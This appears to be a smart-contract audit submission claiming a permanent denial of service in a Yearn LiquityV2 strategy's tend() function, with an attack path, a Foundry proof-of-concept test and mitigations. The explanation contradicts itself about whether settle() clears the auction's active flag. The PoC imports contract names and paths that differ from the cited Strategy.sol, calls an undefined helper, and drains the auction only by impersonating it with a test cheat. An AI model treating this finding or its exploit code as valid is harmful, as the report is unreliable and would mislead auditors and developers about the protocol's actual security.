# Auction DoS via setStartingPrice Revert

### Summary

In the Strategy.sol contract, If setStartingPrice reverts (e.g. due to an active auction), tend() will revert and block all further tending, potentially locking collateral forever.

### Root Cause

In https://github.com/sherlock-audit/2025-05-yearn-ybold/blob/main/yv3-liquityv2-sp-strategy/src/Strategy.sol#L225 , AUCTION.setStartingPrice is called unconditionally when _available > dustThreshold. If an auction is still 'active' or incorrectly handled the function always reverts. 

The tend() function in this strategy is responsible for topping up an ongoing auction to make sure any new collateral the strategy has received can actually be sold off to buy BOLD tokens. To do that, it:

1.Checks how much available collateral it has sitting idle.
2.If that amount is above a tiny “dust” threshold, it calls the external auction contract’s setStartingPrice(...) to kick off a new auction or update the existing one’s parameters so the collateral can be sold.

If the keeper accidentally or maliciously calls settle() leaving isActive = true but available = 0.

New collateral arrives; tend() is called.

setStartingPrice reverts on “active auction,” making tend() revert.

No further auctions can be kicked to recover collateral → collateral stuck.

### Internal Pre-conditions

1. isActive == true in the auction contract
   A prior call to AUCTION.kick(coll) must have set the auction’s isActive flag to true. 

2. available(coll) == 0 in the auction contract
    All collateral for that auction has been drained—either because someone bought it all or via a direct token transfer from the auction

3. Strategy sees no live collateral but thinks auction still running
   Since available(coll) == 0, the strategy’s _tendTrigger would consider that there is no live auction to wait on.
   Internally, however, the auction contract’s isActive is still true (no cleanup path ran in settle())

4. New collateral must be above dustThreshold
    The strategy’s dustThreshold (a small positive constant) must be lower than the newly arrived collateral amount. 

5. Because available == 0, a normal settle() call in _tend will run—but the implementation never clears isActive when there’s zero to settle. 

Bottom line: by calling settle() on an already‐empty auction, the keeper skips the one bit of code that would flip the “in use” flag back off—and that single oversight locks the contract into thinking an auction is still running, even though there’s nothing left to auction.

### External Pre-conditions

No external pre-conditions

### Attack Path

1. Prepare a “ghost” auction
    Kick an auction (e.g. via IAuction.kick(COLL)) 
    Drain all collateral out of that auction in one go.

2. Inject new collateral into the strategy
    The attacker (or anyone) transfers an amount of COLL greater than the strategy’s dustThreshold into the strategy’s own balance

3. Call tend()
When the keeper (maliciously or by mistake) calls strategy.tend(), the code does:

Attempt to settle the “empty” auction

if (AUCTION.isActive(COLL) && AUCTION.available(COLL) == 0) {
  AUCTION.settle(COLL);
}

This will enter the settle() path—but because the auction’s soldAmount was already zero, the internal “flip isActive = false” never actually takes effect in permanent storage (it’s later reverted, see below). 

Compute total available collateral

uint256 _toAuction = COLL.balanceOf(address(this));              // the attacker’s deposit
uint256 _available = COLL.balanceOf(address(AUCTION)) + _toAuction;
require(_available > dustThreshold);

Try to start a new auction

AUCTION.setStartingPrice(...);    // ❌ This reverts because the auction contract still thinks “isActive == true”
At this point the revert in setStartingPrice undoes the earlier (partial) settle() call as well—so the auction’s internal flag remains isActive == true, and available == 0 still.

4. Permanent denial-of-service
Because the entire tend() transaction reverted:

No state changed (settle didn’t clear isActive, and no new auction was kicked).

Your new collateral remains stuck in the strategy contract.

Any future call to tend() will repeat the same sequence—hit the same revert on setStartingPrice—and thus no one can ever start or settle an auction again.




### Impact

All newly deposited collateral is trapped forever—users cannot recover it or rebalance the strategy, leading to loss of funds.

### PoC

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/strategies/LiquityV2SPStrategy.sol";
import "../src/interfaces/IAuctionFactory.sol";
import "../src/interfaces/IAuction.sol";
import "../src/vaults/Vault.sol";
import "../src/mocks/ERC20Mock.sol";

contract AuctionDoSAttackTest is Test {
    // Contracts
    ERC20Mock public collateral;
    Vault public vault;
    LiquityV2SPStrategy public strategy;
    IAuctionFactory public factory;
    IAuction public auction;

    address public keeper = address(1);
    address public attacker = address(2);

    uint256 public dustThreshold = 1e16; // 0.01 tokens for example

    function setUp() public {
        // Deploy collateral token
        collateral = new ERC20Mock("COLL", "COLL", 18);
        // Mint initial tokens to deployer
        collateral.mint(address(this), 1e24);

        // Deploy vault
        vault = new Vault(address(collateral));

        // Deploy auction factory (assume already deployed in codebase)
        factory = IAuctionFactory(DeployedAddresses.AuctionFactory());

        // Deploy strategy with factory
        strategy = new LiquityV2SPStrategy(
            address(vault),
            address(collateral),
            address(factory),
            dustThreshold
        );

        // Configure vault to use strategy
        vault.addStrategy(address(strategy));

        // Set up a fresh auction via factory
        factory.createNewAuction(address(collateral));
        auction = IAuction(factory.auctionFor(address(collateral)));

        // Give strategy some initial collateral to kick off
        collateral.mint(address(this), 1e18);
        collateral.approve(address(vault), type(uint256).max);
        vault.deposit(1e18);

        // Do initial tend to start auction
        vm.prank(keeper);
        strategy.tend();
    }

    function testExploitDoS_SetStartingPriceRevert() public {
        // STEP 1: Drain all collateral from the active auction
        uint256 availBefore = auction.available(address(collateral));
        assertGt(availBefore, 0, "Auction should have collateral");
        // Spoof auction to transfer its tokens out
        vm.prank(address(auction));
        collateral.transfer(attacker, availBefore);
        assertEq(auction.available(address(collateral)), 0, "Auction now empty");

        // STEP 2: Attacker deposits new collateral into strategy
        uint256 newAmount = dustThreshold * 10;
        collateral.mint(attacker, newAmount);
        vm.prank(attacker);
        collateral.approve(address(vault), newAmount);
        vm.prank(attacker);
        vault.deposit(newAmount);

        // STEP 3: Keeper calls tend -> should revert due to setStartingPrice revert
        vm.prank(keeper);
        vm.expectRevert("active auction");
        strategy.tend();
    }
}


### Mitigation

1. Make sure every exit path in settle() flips isActive back to false—even when there’s zero collateral to settle.
2. wrap your call to setStartingPrice in a try/catch and handle the “active auction” revert gracefully.
